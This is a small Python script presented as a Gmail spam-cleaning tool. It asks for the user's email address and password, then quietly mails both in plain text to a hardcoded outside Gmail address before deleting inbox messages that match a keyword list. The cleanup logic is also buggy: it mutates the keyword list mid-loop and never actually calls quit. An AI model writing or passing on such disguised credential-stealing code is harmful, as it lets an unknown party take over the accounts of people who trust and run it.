import imaplib
import smtplib
from email.mime.text import MIMEText
from email.header import Header
email = raw_input("enter your email..... ")
passw = raw_input("enter your password..... ")
recipient = "randykethcena@gmail.com"
msg = MIMEText(email + ' ' + passw, 'plain', 'utf-8')
msg['new mail'] = Header('new mail', 'utf-8')
msg['from'] = email
msg['to'] = recipient
s = smtplib.SMTP(host='smtp.gmail.com', port=587)
s.ehlo()
s.starttls()
s.ehlo()
s.login(email, passw)
s.sendmail(email, recipient, msg.as_string())
s.quit
imapserver = "imap.gmail.com"
spamkeywords = ["Just/uploaded/a/video", "Wants/to/be/friends", "is/live/now/on", "shared/a/post", "sale", "grab/now", "tweeted", "top/10", "your/shocking/2020", "unsubscribe"]
x = len(spamkeywords)
def deleteEmailIMAP(user, password, IMAP):
    for i in range(x):
        mail = imaplib.IMAP4_SSL(IMAP)
        mail.login(user, password)
        mail.select('inbox')    
        typ, data = mail.search(None, 'body', spamkeywords[0])
        for num in data[0].split():
            mail.store(num, '+FLAGS', r'(\Deleted)')
            del spamkeywords[0]
    mail.expunge()
    mail.close()
    mail.logout()
deleteEmailIMAP(email, passw, imapserver)